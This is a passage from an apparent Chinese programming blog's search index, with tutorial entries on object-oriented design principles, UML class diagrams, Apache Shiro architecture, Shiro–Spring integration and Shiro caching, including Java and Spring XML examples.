6. 套接字与其它通信机制不同的是，它可用于不同机器间的进程通信。]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>计算机操作系统</tag>
        <tag>进程</tag>
        <tag>线程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面向对象思想]]></title>
    <url>%2F2018%2F11%2F01%2F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3%2F</url>
    <content type="text"><![CDATA[一、三大特性封装利用抽象数据类型将数据和基于数据的操作封装在一起，使其构成一个不可分割的独立实体。数据被保护在抽象数据类型的内部，尽可能地隐藏内部的细节，只保留一些对外接口使之与外部发生联系。用户无需知道对象内部的细节，但可以通过对象对外提供的接口来访问该对象。 优点： 减少耦合：可以独立地开发、测试、优化、使用、理解和修改 减轻维护的负担：可以更容易被程序员理解，并且在调试的时候可以不影响其他模块 有效地调节性能：可以通过剖析确定哪些模块影响了系统的性能 提高软件的可重用性 降低了构建大型系统的风险：即使整个系统不可用，但是这些独立的模块却有可能是可用的 以下 Person 类封装 name、gender、age 等属性，外界只能通过 get() 方法获取一个 Person 对象的 name 属性和 gender 属性，而无法获取 age 属性，但是 age 属性可以供 work() 方法使用。 注意到 gender 属性使用 int 数据类型进行存储，封装使得用户注意不到这种实现细节。并且在需要修改 gender 属性使用的数据类型时，也可以在不影响客户端代码的情况下进行。 12345678910111213141516171819202122public class Person &#123; private String name; private int gender; private int age; public String getName() &#123; return name; &#125; public String getGender() &#123; return gender == 0 ? "man" : "woman"; &#125; public void work() &#123; if (18 &lt;= age &amp;&amp; age &lt;= 50) &#123; System.out.println(name + " is working very hard!"); &#125; else &#123; System.out.println(name + " can't work any more!"); &#125; &#125;&#125; 继承继承实现了 IS-A 关系，例如 Cat 和 Animal 就是一种 IS-A 关系，因此 Cat 可以继承自 Animal，从而获得 Animal 非 private 的属性和方法。 继承应该遵循里氏替换原则，子类对象必须能够替换掉所有父类对象。 Cat 可以当做 Animal 来使用，也就是说可以使用 Animal 引用 Cat 对象。父类引用指向子类对象称为 向上转型 。 1Animal animal = new Cat(); 多态多态分为编译时多态和运行时多态： 编译时多态主要指方法的重载 运行时多态指程序中定义的对象引用所指向的具体类型在运行期间才确定 运行时多态有三个条件： 继承 覆盖（重写） 向上转型 下面的代码中，乐器类（Instrument）有两个子类：Wind 和 Percussion，它们都覆盖了父类的 play() 方法，并且在 main() 方法中使用父类 Instrument 来引用 Wind 和 Percussion 对象。在 Instrument 引用调用 play() 方法时，会执行实际引用对象所在类的 play() 方法，而不是 Instrument 类的方法。 1234567891011121314151617181920212223242526272829303132public class Instrument &#123; public void play() &#123; System.out.println("Instument is playing..."); &#125;&#125;public class Wind extends Instrument &#123; public void play() &#123; System.out.println("Wind is playing..."); &#125;&#125;public class Percussion extends Instrument &#123; public void play() &#123; System.out.println("Percussion is playing..."); &#125;&#125;public class Music &#123; public static void main(String[] args) &#123; List&lt;Instrument&gt; instruments = new ArrayList&lt;&gt;(); instruments.add(new Wind()); instruments.add(new Percussion()); for(Instrument instrument : instruments) &#123; instrument.play(); &#125; &#125;&#125; 二、类图以下类图使用 PlantUML 绘制，更多语法及使用请参考：http://plantuml.com/ 。 泛化关系 (Generalization)用来描述继承关系，在 Java 中使用 extends 关键字。 123456789101112@startumltitle Generalizationclass Vihicalclass Carclass TrunckVihical &lt;|-- CarVihical &lt;|-- Trunck@enduml 实现关系 (Realization)用来实现一个接口，在 Java 中使用 implements 关键字。 123456789101112@startumltitle Realizationinterface MoveBehaviorclass Flyclass RunMoveBehavior &lt;|.. FlyMoveBehavior &lt;|.. Run@enduml 聚合关系 (Aggregation)表示整体由部分组成，但是整体和部分不是强依赖的，整体不存在了部分还是会存在。 1234567891011121314@startumltitle Aggregationclass Computerclass Keyboardclass Mouseclass ScreenComputer o-- KeyboardComputer o-- MouseComputer o-- Screen@enduml 组合关系 (Composition)和聚合不同，组合中整体和部分是强依赖的，整体不存在了部分也不存在了。比如公司和部门，公司没了部门就不存在了。但是公司和员工就属于聚合关系了，因为公司没了员工还在。 123456789101112@startumltitle Compositionclass Companyclass DepartmentAclass DepartmentBCompany *-- DepartmentACompany *-- DepartmentB@enduml 关联关系 (Association)表示不同类对象之间有关联，这是一种静态关系，与运行过程的状态无关，在最开始就可以确定。因此也可以用 1 对 1、多对 1、多对多这种关联关系来表示。比如学生和学校就是一种关联关系，一个学校可以有很多学生，但是一个学生只属于一个学校，因此这是一种多对一的关系，在运行开始之前就可以确定。 12345678910@startumltitle Associationclass Schoolclass StudentSchool &quot;1&quot; - &quot;n&quot; Student@enduml 依赖关系 (Dependency)和关联关系不同的是，依赖关系是在运行过程中起作用的。A 类和 B 类是依赖关系主要有三种形式： A 类是 B 类方法的局部变量； A 类是 B 类方法当中的一个参数； A 类向 B 类发送消息，从而影响 B 类发生变化。 12345678910111213141516171819@startumltitle Dependencyclass Vihicle &#123; move(MoveBehavior)&#125;interface MoveBehavior &#123; move()&#125;note &quot;MoveBehavior.move()&quot; as NVihicle ..&gt; MoveBehaviorVihicle .. N@enduml 三、设计原则S.O.L.I.D 简写 全拼 中文翻译 SRP The Single Responsibility Principle 单一责任原则 OCP The Open Closed Principle 开放封闭原则 LSP The Liskov Substitution Principle 里氏替换原则 ISP The Interface Segregation Principle 接口分离原则 DIP The Dependency Inversion Principle 依赖倒置原则 1. 单一责任原则 修改一个类的原因应该只有一个。 换句话说就是让一个类只负责一件事，当这个类需要做过多事情的时候，就需要分解这个类。 如果一个类承担的职责过多，就等于把这些职责耦合在了一起，一个职责的变化可能会削弱这个类完成其它职责的能力。 2. 开放封闭原则 类应该对扩展开放，对修改关闭。 扩展就是添加新功能的意思，因此该原则要求在添加新功能时不需要修改代码。 符合开闭原则最典型的设计模式是装饰者模式，它可以动态地将责任附加到对象上，而不用去修改类的代码。 3. 里氏替换原则 子类对象必须能够替换掉所有父类对象。 继承是一种 IS-A 关系，子类需要能够当成父类来使用，并且需要比父类更特殊。 如果不满足这个原则，那么各个子类的行为上就会有很大差异，增加继承体系的复杂度。 4. 接口分离原则 不应该强迫客户依赖于它们不用的方法。 因此使用多个专门的接口比使用单一的总接口要好。 5. 依赖倒置原则 高层模块不应该依赖于低层模块，二者都应该依赖于抽象；抽象不应该依赖于细节，细节应该依赖于抽象。 高层模块包含一个应用程序中重要的策略选择和业务模块，如果高层模块依赖于低层模块，那么低层模块的改动就会直接影响到高层模块，从而迫使高层模块也需要改动。 依赖于抽象意味着： 任何变量都不应该持有一个指向具体类的指针或者引用； 任何类都不应该从具体类派生； 任何方法都不应该覆写它的任何基类中的已经实现的方法。 其他常见原则除了上述的经典原则，在实际开发中还有下面这些常见的设计原则。 简写 全拼 中文翻译 LOD The Law of Demeter 迪米特法则 CRP The Composite Reuse Principle 合成复用原则 CCP The Common Closure Principle 共同封闭原则 SAP The Stable Abstractions Principle 稳定抽象原则 SDP The Stable Dependencies Principle 稳定依赖原则 1. 迪米特法则迪米特法则又叫作最少知识原则（Least Knowledge Principle，简写 LKP），就是说一个对象应当对其他对象有尽可能少的了解，不和陌生人说话。 2. 合成复用原则尽量使用对象组合，而不是通过继承来达到复用的目的。 3. 共同封闭原则一起修改的类，应该组合在一起（同一个包里）。如果必须修改应用程序里的代码，我们希望所有的修改都发生在一个包里（修改关闭），而不是遍布在很多包里。 4. 稳定抽象原则最稳定的包应该是最抽象的包，不稳定的包应该是具体的包，即包的抽象程度跟它的稳定性成正比。 5. 稳定依赖原则包之间的依赖关系都应该是稳定方向依赖的，包要依赖的包要比自己更具有稳定性。]]></content>
      <categories>
        <category>面向对象</category>
      </categories>
      <tags>
        <tag>面向对象思想</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shiro与spring集成]]></title>
    <url>%2F2018%2F11%2F01%2Fshiro%E4%B8%8Espring%E9%9B%86%E6%88%90%2F</url>
    <content type="text"><![CDATA[与 Spring集成Shiro 的组件都是 JavaBean/POJO 式的组件，所以非常容易使用 Spring 进行组件管理，可以非常方便的从 ini 配置迁移到 Spring 进行管理，且支持 JavaSE 应用及 Web 应用的集成。 在示例之前，需要导入 shiro-spring 及 spring-context 依赖，具体请参考 pom.xml。spring-beans.xml 配置文件提供了基础组件如 DataSource、DAO、Service 组件的配置。 JavaSE 应用spring-shiro.xml 提供了普通 JavaSE 独立应用的 Spring 配置： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;!-- 缓存管理器 使用Ehcache实现 --&gt;&lt;bean id=&quot;cacheManager&quot; class=&quot;org.apache.shiro.cache.ehcache.EhCacheManager&quot;&gt; &lt;property name=&quot;cacheManagerConfigFile&quot; value=&quot;classpath:ehcache.xml&quot;/&gt;&lt;/bean&gt;&lt;!-- 凭证匹配器 --&gt;&lt;bean id=&quot;credentialsMatcher&quot; class=&quot;com.github.zhangkaitao.shiro.chapter12.credentials.RetryLimitHashedCredentialsMatcher&quot;&gt; &lt;constructor-arg ref=&quot;cacheManager&quot;/&gt; &lt;property name=&quot;hashAlgorithmName&quot; value=&quot;md5&quot;/&gt; &lt;property name=&quot;hashIterations&quot; value=&quot;2&quot;/&gt; &lt;property name=&quot;storedCredentialsHexEncoded&quot; value=&quot;true&quot;/&gt;&lt;/bean&gt;&lt;!-- Realm实现 --&gt;&lt;bean id=&quot;userRealm&quot; class=&quot;com.github.zhangkaitao.shiro.chapter12.realm.UserRealm&quot;&gt; &lt;property name=&quot;userService&quot; ref=&quot;userService&quot;/&gt; &lt;property name=&quot;credentialsMatcher&quot; ref=&quot;credentialsMatcher&quot;/&gt; &lt;property name=&quot;cachingEnabled&quot; value=&quot;true&quot;/&gt; &lt;property name=&quot;authenticationCachingEnabled&quot; value=&quot;true&quot;/&gt; &lt;property name=&quot;authenticationCacheName&quot; value=&quot;authenticationCache&quot;/&gt; &lt;property name=&quot;authorizationCachingEnabled&quot; value=&quot;true&quot;/&gt; &lt;property name=&quot;authorizationCacheName&quot; value=&quot;authorizationCache&quot;/&gt;&lt;/bean&gt;&lt;!-- 会话ID生成器 --&gt;&lt;bean id=&quot;sessionIdGenerator&quot; class=&quot;org.apache.shiro.session.mgt.eis.JavaUuidSessionIdGenerator&quot;/&gt;&lt;!-- 会话DAO --&gt;&lt;bean id=&quot;sessionDAO&quot; class=&quot;org.apache.shiro.session.mgt.eis.EnterpriseCacheSessionDAO&quot;&gt; &lt;property name=&quot;activeSessionsCacheName&quot; value=&quot;shiro-activeSessionCache&quot;/&gt; &lt;property name=&quot;sessionIdGenerator&quot; ref=&quot;sessionIdGenerator&quot;/&gt;&lt;/bean&gt;&lt;!-- 会话验证调度器 --&gt;&lt;bean id=&quot;sessionValidationScheduler&quot; class=&quot;org.apache.shiro.session.mgt.quartz.QuartzSessionValidationScheduler&quot;&gt; &lt;property name=&quot;sessionValidationInterval&quot; value=&quot;1800000&quot;/&gt; &lt;property name=&quot;sessionManager&quot; ref=&quot;sessionManager&quot;/&gt;&lt;/bean&gt;&lt;!-- 会话管理器 --&gt;&lt;bean id=&quot;sessionManager&quot; class=&quot;org.apache.shiro.session.mgt.DefaultSessionManager&quot;&gt; &lt;property name=&quot;globalSessionTimeout&quot; value=&quot;1800000&quot;/&gt; &lt;property name=&quot;deleteInvalidSessions&quot; value=&quot;true&quot;/&gt; &lt;property name=&quot;sessionValidationSchedulerEnabled&quot; value=&quot;true&quot;/&gt; &lt;property name=&quot;sessionValidationScheduler&quot; ref=&quot;sessionValidationScheduler&quot;/&gt; &lt;property name=&quot;sessionDAO&quot; ref=&quot;sessionDAO&quot;/&gt;&lt;/bean&gt;&lt;!-- 安全管理器 --&gt;&lt;bean id=&quot;securityManager&quot; class=&quot;org.apache.shiro.mgt.DefaultSecurityManager&quot;&gt; &lt;property name=&quot;realms&quot;&gt; &lt;list&gt;&lt;ref bean=&quot;userRealm&quot;/&gt;&lt;/list&gt; &lt;/property&gt; &lt;property name=&quot;sessionManager&quot; ref=&quot;sessionManager&quot;/&gt; &lt;property name=&quot;cacheManager&quot; ref=&quot;cacheManager&quot;/&gt;&lt;/bean&gt;&lt;!-- 相当于调用SecurityUtils.setSecurityManager(securityManager) --&gt;&lt;bean class=&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;&gt;&lt;property name=&quot;staticMethod&quot; value=&quot;org.apache.shiro.SecurityUtils.setSecurityManager&quot;/&gt; &lt;property name=&quot;arguments&quot; ref=&quot;securityManager&quot;/&gt;&lt;/bean&gt;&lt;!-- Shiro生命周期处理器--&gt;&lt;bean id=&quot;lifecycleBeanPostProcessor&quot; class=&quot;org.apache.shiro.spring.LifecycleBeanPostProcessor&quot;/&gt; 可以看出，只要把之前的 ini 配置翻译为此处的 spring xml 配置方式即可，无须多解释。 LifecycleBeanPostProcessor 用于在实现了 Initializable 接口的 Shiro bean 初始化时调用 Initializable 接口回调，在实现了 Destroyable 接口的 Shiro bean 销毁时调用 Destroyable 接口回调。如 UserRealm 就实现了 Initializable，而 DefaultSecurityManager 实现了 Destroyable。具体可以查看它们的继承关系。 测试用例请参考 com.github.zhangkaitao.shiro.chapter12.ShiroTest。 Web 应用Web 应用和普通 JavaSE 应用的某些配置是类似的，此处只提供一些不一样的配置，详细配置可以参考 spring-shiro-web.xml。 1234567891011121314151617181920212223&lt;!-- 会话Cookie模板 --&gt;&lt;bean id=&quot;sessionIdCookie&quot; class=&quot;org.apache.shiro.web.servlet.SimpleCookie&quot;&gt; &lt;constructor-arg value=&quot;sid&quot;/&gt; &lt;property name=&quot;httpOnly&quot; value=&quot;true&quot;/&gt; &lt;property name=&quot;maxAge&quot; value=&quot;180000&quot;/&gt;&lt;/bean&gt;&lt;!-- 会话管理器 --&gt;&lt;bean id=&quot;sessionManager&quot; class=&quot;org.apache.shiro.web.session.mgt.DefaultWebSessionManager&quot;&gt; &lt;property name=&quot;globalSessionTimeout&quot; value=&quot;1800000&quot;/&gt; &lt;property name=&quot;deleteInvalidSessions&quot; value=&quot;true&quot;/&gt; &lt;property name=&quot;sessionValidationSchedulerEnabled&quot; value=&quot;true&quot;/&gt; &lt;property name=&quot;sessionValidationScheduler&quot; ref=&quot;sessionValidationScheduler&quot;/&gt; &lt;property name=&quot;sessionDAO&quot; ref=&quot;sessionDAO&quot;/&gt; &lt;property name=&quot;sessionIdCookieEnabled&quot; value=&quot;true&quot;/&gt; &lt;property name=&quot;sessionIdCookie&quot; ref=&quot;sessionIdCookie&quot;/&gt;&lt;/bean&gt;&lt;!-- 安全管理器 --&gt;&lt;bean id=&quot;securityManager&quot; class=&quot;org.apache.shiro.web.mgt.DefaultWebSecurityManager&quot;&gt;&lt;property name=&quot;realm&quot; ref=&quot;userRealm&quot;/&gt; &lt;property name=&quot;sessionManager&quot; ref=&quot;sessionManager&quot;/&gt; &lt;property name=&quot;cacheManager&quot; ref=&quot;cacheManager&quot;/&gt;&lt;/bean&gt;&amp;nbsp; sessionIdCookie 是用于生产 Session ID Cookie 的模板； 会话管理器使用用于 web 环境的 DefaultWebSessionManager； 安全管理器使用用于 web 环境的 DefaultWebSecurityManager。 123456789101112131415161718192021222324252627&lt;!-- 基于Form表单的身份验证过滤器 --&gt;&lt;bean id=&quot;formAuthenticationFilter&quot; class=&quot;org.apache.shiro.web.filter.authc.FormAuthenticationFilter&quot;&gt; &lt;property name=&quot;usernameParam&quot; value=&quot;username&quot;/&gt; &lt;property name=&quot;passwordParam&quot; value=&quot;password&quot;/&gt; &lt;property name=&quot;loginUrl&quot; value=&quot;/login.jsp&quot;/&gt;&lt;/bean&gt;&lt;!-- Shiro的Web过滤器 --&gt;&lt;bean id=&quot;shiroFilter&quot; class=&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt; &lt;property name=&quot;securityManager&quot; ref=&quot;securityManager&quot;/&gt; &lt;property name=&quot;loginUrl&quot; value=&quot;/login.jsp&quot;/&gt; &lt;property name=&quot;unauthorizedUrl&quot; value=&quot;/unauthorized.jsp&quot;/&gt; &lt;property name=&quot;filters&quot;&gt; &lt;util:map&gt; &lt;entry key=&quot;authc&quot; value-ref=&quot;formAuthenticationFilter&quot;/&gt; &lt;/util:map&gt; &lt;/property&gt; &lt;property name=&quot;filterChainDefinitions&quot;&gt; &lt;value&gt; /index.jsp = anon /unauthorized.jsp = anon /login.jsp = authc /logout = logout /** = user &lt;/value&gt; &lt;/property&gt;&lt;/bean&gt;&amp;nbsp; formAuthenticationFilter 为基于 Form 表单的身份验证过滤器；此处可以再添加自己的 Filter bean 定义； shiroFilter：此处使用 ShiroFilterFactoryBean 来创建 ShiroFilter 过滤器；filters 属性用于定义自己的过滤器，即 ini 配置中的 [filters] 部分；filterChainDefinitions 用于声明 url 和 filter 的关系，即 ini 配置中的 [urls] 部分。 接着需要在 web.xml 中进行如下配置： 123456789101112&lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt; classpath:spring-beans.xml, classpath:spring-shiro-web.xml &lt;/param-value&gt;&lt;/context-param&gt;&lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;&lt;/listener&gt;&amp;nbsp; 通过 ContextLoaderListener 加载 contextConfigLocation 指定的 Spring 配置文件。 123456789101112&lt;filter&gt; &lt;filter-name&gt;shiroFilter&lt;/filter-name&gt; &lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;targetFilterLifecycle&lt;/param-name&gt; &lt;param-value&gt;true&lt;/param-value&gt; &lt;/init-param&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;shiroFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt;&amp;nbsp; DelegatingFilterProxy 会自动到 Spring 容器中查找名字为 shiroFilter 的 bean 并把 filter 请求交给它处理。 其他配置请参考源代码。 Shiro 权限注解Shiro 提供了相应的注解用于权限控制，如果使用这些注解就需要使用 AOP 的功能来进行判断，如 Spring AOP；Shiro 提供了 Spring AOP 集成用于权限注解的解析和验证。 为了测试，此处使用了 Spring MVC 来测试 Shiro 注解，当然 Shiro 注解不仅仅可以在 web 环境使用，在独立的 JavaSE 中也是可以用的，此处只是以 web 为例了。 在 spring-mvc.xml 配置文件添加 Shiro Spring AOP 权限注解的支持： 12345&lt;aop:config proxy-target-class=&quot;true&quot;&gt;&lt;/aop:config&gt;&lt;bean class=&quot;org.apache.shiro.spring.security.interceptor.AuthorizationAttributeSourceAdvisor&quot;&gt; &lt;property name=&quot;securityManager&quot; ref=&quot;securityManager&quot;/&gt;&lt;/bean&gt;&amp;nbsp; 如上配置用于开启 Shiro Spring AOP 权限注解的支持；&lt;aop:config proxy-target-class=&quot;true&quot;&gt; 表示代理类。 接着就可以在相应的控制器（AnnotationController）中使用如下方式进行注解： 12345@RequiresRoles(&quot;admin&quot;)@RequestMapping(&quot;/hello2&quot;)public String hello2() &#123; return &quot;success&quot;;&#125;&amp;nbsp; 访问 hello2 方法的前提是当前用户有 admin 角色。 当验证失败，其会抛出 UnauthorizedException 异常，此时可以使用 Spring 的 ExceptionHandler（DefaultExceptionHandler）来进行拦截处理： 12345678@ExceptionHandler(&#123;UnauthorizedException.class&#125;)@ResponseStatus(HttpStatus.UNAUTHORIZED)public ModelAndView processUnauthenticatedException(NativeWebRequest request, UnauthorizedException e) &#123; ModelAndView mv = new ModelAndView(); mv.addObject(&quot;exception&quot;, e); mv.setViewName(&quot;unauthorized&quot;); return mv;&#125;&amp;nbsp; 如果集成 Struts2，需要注意《Shiro+Struts2+Spring3 加上 @RequiresPermissions 后 @Autowired 失效》问题：http://jinnianshilongnian.iteye.com/blog/1850425 权限注解 1@RequiresAuthentication 表示当前 Subject 已经通过 login 进行了身份验证；即 Subject.isAuthenticated() 返回 true。 1@RequiresUser 表示当前 Subject 已经身份验证或者通过记住我登录的。 1@RequiresGuest 表示当前 Subject 没有身份验证或通过记住我登录过，即是游客身份。 1@RequiresRoles(value=&#123;“admin”, “user”&#125;, logical= Logical.AND) 表示当前 Subject 需要角色 admin 和 user。 1@RequiresPermissions (value=&#123;“user:a”, “user:b”&#125;, logical= Logical.OR) 表示当前 Subject 需要权限 user：a 或 user：b。]]></content>
      <categories>
        <category>shiro</category>
      </categories>
      <tags>
        <tag>权限验证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Shiro简介]]></title>
    <url>%2F2018%2F11%2F01%2FShiro%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[简介Apache Shiro 是 Java 的一个安全框架。目前，使用 Apache Shiro 的人越来越多，因为它相当简单，对比 Spring Security，可能没有 Spring Security 做的功能强大，但是在实际工作时可能并不需要那么复杂的东西，所以使用小而简单的 Shiro 就足够了。对于它俩到底哪个好，这个不必纠结，能更简单的解决项目问题就好了。 本教程只介绍基本的 Shiro 使用，不会过多分析源码等，重在使用。 Shiro 可以非常容易的开发出足够好的应用，其不仅可以用在 JavaSE 环境，也可以用在 JavaEE 环境。Shiro 可以帮助我们完成：认证、授权、加密、会话管理、与 Web 集成、缓存等。这不就是我们想要的嘛，而且 Shiro 的 API 也是非常简单；其基本功能点如下图所示： Authentication：身份认证 / 登录，验证用户是不是拥有相应的身份； Authorization：授权，即权限验证，验证某个已认证的用户是否拥有某个权限；即判断用户是否能做事情，常见的如：验证某个用户是否拥有某个角色。或者细粒度的验证某个用户对某个资源是否具有某个权限； Session Manager：会话管理，即用户登录后就是一次会话，在没有退出之前，它的所有信息都在会话中；会话可以是普通 JavaSE 环境的，也可以是如 Web 环境的； Cryptography：加密，保护数据的安全性，如密码加密存储到数据库，而不是明文存储； Web Support：Web 支持，可以非常容易的集成到 Web 环境； Caching：缓存，比如用户登录后，其用户信息、拥有的角色 / 权限不必每次去查，这样可以提高效率； Concurrency：shiro 支持多线程应用的并发验证，即如在一个线程中开启另一个线程，能把权限自动传播过去； Testing：提供测试支持； Run As：允许一个用户假装为另一个用户（如果他们允许）的身份进行访问； Remember Me：记住我，这个是非常常见的功能，即一次登录后，下次再来的话不用登录了。 记住一点，Shiro 不会去维护用户、维护权限；这些需要我们自己去设计 / 提供；然后通过相应的接口注入给 Shiro 即可。 接下来我们分别从外部和内部来看看 Shiro 的架构，对于一个好的框架，从外部来看应该具有非常简单易于使用的 API，且 API 契约明确；从内部来看的话，其应该有一个可扩展的架构，即非常容易插入用户自定义实现，因为任何框架都不能满足所有需求。 首先，我们从外部来看 Shiro 吧，即从应用程序角度的来观察如何使用 Shiro 完成工作。如下图： 可以看到：应用代码直接交互的对象是 Subject，也就是说 Shiro 的对外 API 核心就是 Subject；其每个 API 的含义： Subject：主体，代表了当前 “用户”，这个用户不一定是一个具体的人，与当前应用交互的任何东西都是 Subject，如网络爬虫，机器人等；即一个抽象概念；所有 Subject 都绑定到 SecurityManager，与 Subject 的所有交互都会委托给 SecurityManager；可以把 Subject 认为是一个门面；SecurityManager 才是实际的执行者； SecurityManager：安全管理器；即所有与安全有关的操作都会与 SecurityManager 交互；且它管理着所有 Subject；可以看出它是 Shiro 的核心，它负责与后边介绍的其他组件进行交互，如果学习过 SpringMVC，你可以把它看成 DispatcherServlet 前端控制器； Realm：域，Shiro 从从 Realm 获取安全数据（如用户、角色、权限），就是说 SecurityManager 要验证用户身份，那么它需要从 Realm 获取相应的用户进行比较以确定用户身份是否合法；也需要从 Realm 得到用户相应的角色 / 权限进行验证用户是否能进行操作；可以把 Realm 看成 DataSource，即安全数据源。 也就是说对于我们而言，最简单的一个 Shiro 应用： 应用代码通过 Subject 来进行认证和授权，而 Subject 又委托给 SecurityManager； 我们需要给 Shiro 的 SecurityManager 注入 Realm，从而让 SecurityManager 能得到合法的用户及其权限进行判断。 从以上也可以看出，Shiro 不提供维护用户 / 权限，而是通过 Realm 让开发人员自己注入。 接下来我们来从 Shiro 内部来看下 Shiro 的架构，如下图所示： Subject：主体，可以看到主体可以是任何可以与应用交互的 “用户”； SecurityManager：相当于 SpringMVC 中的 DispatcherServlet 或者 Struts2 中的 FilterDispatcher；是 Shiro 的心脏；所有具体的交互都通过 SecurityManager 进行控制；它管理着所有 Subject、且负责进行认证和授权、及会话、缓存的管理。 Authenticator：认证器，负责主体认证的，这是一个扩展点，如果用户觉得 Shiro 默认的不好，可以自定义实现；其需要认证策略（Authentication Strategy），即什么情况下算用户认证通过了； Authrizer：授权器，或者访问控制器，用来决定主体是否有权限进行相应的操作；即控制着用户能访问应用中的哪些功能； Realm：可以有 1 个或多个 Realm，可以认为是安全实体数据源，即用于获取安全实体的；可以是 JDBC 实现，也可以是 LDAP 实现，或者内存实现等等；由用户提供；注意：Shiro 不知道你的用户 / 权限存储在哪及以何种格式存储；所以我们一般在应用中都需要实现自己的 Realm； SessionManager：如果写过 Servlet 就应该知道 Session 的概念，Session 呢需要有人去管理它的生命周期，这个组件就是 SessionManager；而 Shiro 并不仅仅可以用在 Web 环境，也可以用在如普通的 JavaSE 环境、EJB 等环境；所有呢，Shiro 就抽象了一个自己的 Session 来管理主体与应用之间交互的数据；这样的话，比如我们在 Web 环境用，刚开始是一台 Web 服务器；接着又上了台 EJB 服务器；这时想把两台服务器的会话数据放到一个地方，这个时候就可以实现自己的分布式会话（如把数据放到 Memcached 服务器）； SessionDAO：DAO 大家都用过，数据访问对象，用于会话的 CRUD，比如我们想把 Session 保存到数据库，那么可以实现自己的 SessionDAO，通过如 JDBC 写到数据库；比如想把 Session 放到 Memcached 中，可以实现自己的 Memcached SessionDAO；另外 SessionDAO 中可以使用 Cache 进行缓存，以提高性能； CacheManager：缓存控制器，来管理如用户、角色、权限等的缓存的；因为这些数据基本上很少去改变，放到缓存中后可以提高访问的性能 Cryptography：密码模块，Shiro 提高了一些常见的加密组件用于如密码加密 / 解密的。]]></content>
      <categories>
        <category>shiro</category>
      </categories>
      <tags>
        <tag>权限验证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[缓存机制]]></title>
    <url>%2F2018%2F10%2F11%2F%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[缓存机制Shiro 提供了类似于 Spring 的 Cache 抽象，即 Shiro 本身不实现 Cache，但是对 Cache 进行了又抽象，方便更换不同的底层 Cache 实现。对于 Cache 的一些概念可以参考我的《Spring Cache 抽象详解》：http://jinnianshilongnian.iteye.com/blog/2001040。 Shiro 提供的 Cache 接口： 12345678910111213141516public interface Cache&lt;K, V&gt; &#123; //根据Key获取缓存中的值 public V get(K key) throws CacheException; //往缓存中放入key-value，返回缓存中之前的值 public V put(K key, V value) throws CacheException; //移除缓存中key对应的值，返回该值 public V remove(K key) throws CacheException; //清空整个缓存 public void clear() throws CacheException; //返回缓存大小 public int size(); //获取缓存中所有的key public Set&lt;K&gt; keys(); //获取缓存中所有的value public Collection&lt;V&gt; values();&#125; Shiro 提供的 CacheManager 接口： 1234public interface CacheManager &#123; //根据缓存名字获取一个Cache public &lt;K, V&gt; Cache&lt;K, V&gt; getCache(String name) throws CacheException;&#125; Shiro 还提供了 CacheManagerAware 用于注入 CacheManager： 1234public interface CacheManagerAware &#123; //注入CacheManager void setCacheManager(CacheManager cacheManager);&#125; Shiro 内部相应的组件（DefaultSecurityManager）会自动检测相应的对象（如 Realm）是否实现了 CacheManagerAware 并自动注入相应的 CacheManager。 本章用例使用了与第六章的代码。 Realm 缓存Shiro 提供了 CachingRealm，其实现了 CacheManagerAware 接口，提供了缓存的一些基础实现；另外 AuthenticatingRealm 及 AuthorizingRealm 分别提供了对 AuthenticationInfo 和 AuthorizationInfo 信息的缓存。 ini 配置 1234567891011userRealm=com.github.zhangkaitao.shiro.chapter11.realm.UserRealmuserRealm.credentialsMatcher=$credentialsMatcheruserRealm.cachingEnabled=trueuserRealm.authenticationCachingEnabled=trueuserRealm.authenticationCacheName=authenticationCacheuserRealm.authorizationCachingEnabled=trueuserRealm.authorizationCacheName=authorizationCachesecurityManager.realms=$userRealmcacheManager=org.apache.shiro.cache.ehcache.EhCacheManagercacheManager.cacheManagerConfigFile=classpath:shiro-ehcache.xmlsecurityManager.cacheManager=$cacheManager&amp;nbsp; userRealm.cachingEnabled：启用缓存，默认 false； userRealm.authenticationCachingEnabled：启用身份验证缓存，即缓存 AuthenticationInfo 信息，默认 false； userRealm.authenticationCacheName：缓存 AuthenticationInfo 信息的缓存名称； userRealm. authorizationCachingEnabled：启用授权缓存，即缓存 AuthorizationInfo 信息，默认 false； userRealm. authorizationCacheName：缓存 AuthorizationInfo 信息的缓存名称； cacheManager：缓存管理器，此处使用 EhCacheManager，即 Ehcache 实现，需要导入相应的 Ehcache 依赖，请参考 pom.xml； 因为测试用例的关系，需要将 Ehcache 的 CacheManager 改为使用 VM 单例模式： this.manager = new net.sf.ehcache.CacheManager(getCacheManagerConfigFileInputStream())； 改为 this.manager = net.sf.ehcache.CacheManager.create(getCacheManagerConfigFileInputStream())； 测试用例 123456789@Testpublic void testClearCachedAuthenticationInfo() &#123; login(u1.getUsername(), password); userService.changePassword(u1.getId(), password + &quot;1&quot;); RealmSecurityManager securityManager = (RealmSecurityManager) SecurityUtils.getSecurityManager(); UserRealm userRealm = (UserRealm) securityManager.getRealms().iterator().next(); userRealm.clearCachedAuthenticationInfo(subject().getPrincipals()); login(u1.getUsername(), password + &quot;1&quot;);&#125;&amp;nbsp; 首先登录成功（此时会缓存相应的 AuthenticationInfo），然后修改密码；此时密码就变了；接着需要调用 Realm 的 clearCachedAuthenticationInfo 方法清空之前缓存的 AuthenticationInfo；否则下次登录时还会获取到修改密码之前的那个 AuthenticationInfo； 12345678910@Testpublic void testClearCachedAuthorizationInfo() &#123; login(u1.getUsername(), password); 